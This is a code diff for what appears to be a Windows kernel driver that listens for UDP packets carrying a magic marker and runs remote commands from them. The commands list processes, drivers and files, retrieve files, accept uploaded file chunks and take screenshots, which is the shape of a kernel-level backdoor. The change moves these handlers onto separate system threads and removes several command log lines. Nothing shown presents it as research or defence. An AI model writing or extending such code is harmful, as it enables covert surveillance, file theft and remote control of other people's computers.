@@ -47,29 +47,73 @@ static BOOLEAN NetDrvHasMagic(_In_reads_bytes_(len) const CHAR* buf, _In_ SIZE_T
                             NETDRV_UDP_PACKET_MAGIC_LEN) == NETDRV_UDP_PACKET_MAGIC_LEN;
 }
 
-static VOID NetDrvHandleCommand(_In_z_ PCSTR cmd)
+/* ---- Async dispatch: heavy commands run in their own system thread ---- */
+
+typedef struct _ASYNC_CMD {
+    CHAR Command[NETDRV_CMD_SLOT_BYTES];
+} ASYNC_CMD;
+
+static VOID AsyncCmdThread(_In_ PVOID Context)
 {
-    LOG("handle command '%.40s'", cmd);
+    ASYNC_CMD* ac = (ASYNC_CMD*)Context;
+    PCSTR cmd = ac->Command;
+
     if (strncmp(cmd, NETDRV_CMD_ENUM_PROCESS, strlen(NETDRV_CMD_ENUM_PROCESS)) == 0) {
-        LOG("UDP command: process");
         (void)NetDrvEnumProcess();
     } else if (strncmp(cmd, NETDRV_CMD_ENUM_DRIVER, strlen(NETDRV_CMD_ENUM_DRIVER)) == 0) {
-        LOG("UDP command: driver");
         (void)NetDrvEnumDriver();
     } else if (strncmp(cmd, NETDRV_CMD_ENUM_FILE, strlen(NETDRV_CMD_ENUM_FILE)) == 0) {
-        LOG("UDP command: file path='%s'", cmd + strlen(NETDRV_CMD_ENUM_FILE));
         (void)NetDrvEnumFile(cmd + strlen(NETDRV_CMD_ENUM_FILE));
     } else if (strncmp(cmd, NETDRV_CMD_GET_FILE, strlen(NETDRV_CMD_GET_FILE)) == 0) {
         (void)NetDrvGetFile(cmd + strlen(NETDRV_CMD_GET_FILE));
-    } else if (strncmp(cmd, NETDRV_CMD_PUT_END, strlen(NETDRV_CMD_PUT_END)) == 0) {
+    } else if (strncmp(cmd, NETDRV_CMD_SCREENSHOT, strlen(NETDRV_CMD_SCREENSHOT)) == 0) {
+        (void)NetDrvScreenCapture();
+    }
+
+    ExFreePoolWithTag(ac, 'dmcA');
+    PsTerminateSystemThread(STATUS_SUCCESS);
+}
+
+static VOID NetDrvDispatchAsync(_In_z_ PCSTR cmd)
+{
+    ASYNC_CMD* ac = (ASYNC_CMD*)ExAllocatePool2(
+        POOL_FLAG_NON_PAGED, sizeof(ASYNC_CMD), 'dmcA');
+    if (!ac) { LOG("async dispatch: alloc failed"); return; }
+    RtlStringCbCopyA(ac->Command, sizeof(ac->Command), cmd);
+
+    HANDLE hThread = NULL;
+    NTSTATUS st = PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS,
+        NULL, NULL, NULL, AsyncCmdThread, ac);
+    if (NT_SUCCESS(st)) {
+        ZwClose(hThread);
+    } else {
+        LOG("async dispatch: PsCreateSystemThread failed 0x%08X", st);
+        ExFreePoolWithTag(ac, 'dmcA');
+    }
+}
+
+static VOID NetDrvHandleCommand(_In_z_ PCSTR cmd)
+{
+    LOG("handle command '%.40s'", cmd);
+
+    /* Heavy commands: dispatch to a dedicated thread */
+    if (strncmp(cmd, NETDRV_CMD_ENUM_PROCESS, strlen(NETDRV_CMD_ENUM_PROCESS)) == 0 ||
+        strncmp(cmd, NETDRV_CMD_ENUM_DRIVER, strlen(NETDRV_CMD_ENUM_DRIVER)) == 0 ||
+        strncmp(cmd, NETDRV_CMD_ENUM_FILE, strlen(NETDRV_CMD_ENUM_FILE)) == 0 ||
+        strncmp(cmd, NETDRV_CMD_GET_FILE, strlen(NETDRV_CMD_GET_FILE)) == 0 ||
+        strncmp(cmd, NETDRV_CMD_SCREENSHOT, strlen(NETDRV_CMD_SCREENSHOT)) == 0)
+    {
+        NetDrvDispatchAsync(cmd);
+        return;
+    }
+
+    /* Light commands: handle inline on the control thread */
+    if (strncmp(cmd, NETDRV_CMD_PUT_END, strlen(NETDRV_CMD_PUT_END)) == 0) {
         (void)NetDrvPutEnd(cmd + strlen(NETDRV_CMD_PUT_END));
     } else if (strncmp(cmd, NETDRV_CMD_PUT_BEGIN, strlen(NETDRV_CMD_PUT_BEGIN)) == 0) {
         (void)NetDrvPutBegin(cmd + strlen(NETDRV_CMD_PUT_BEGIN));
     } else if (cmd[0] == 'P' && cmd[1] == '|') {
         (void)NetDrvPutChunk(cmd + 2);
-    } else if (strncmp(cmd, NETDRV_CMD_SCREENSHOT, strlen(NETDRV_CMD_SCREENSHOT)) == 0) {
-        LOG("UDP command: screenshot");
-        (void)NetDrvScreenCapture();
     } else if (strncmp(cmd, NETDRV_CMD_STOP, strlen(NETDRV_CMD_STOP)) == 0) {
         LOG("UDP command: stop");
         InterlockedExchange(&g_ControlStop, 1);
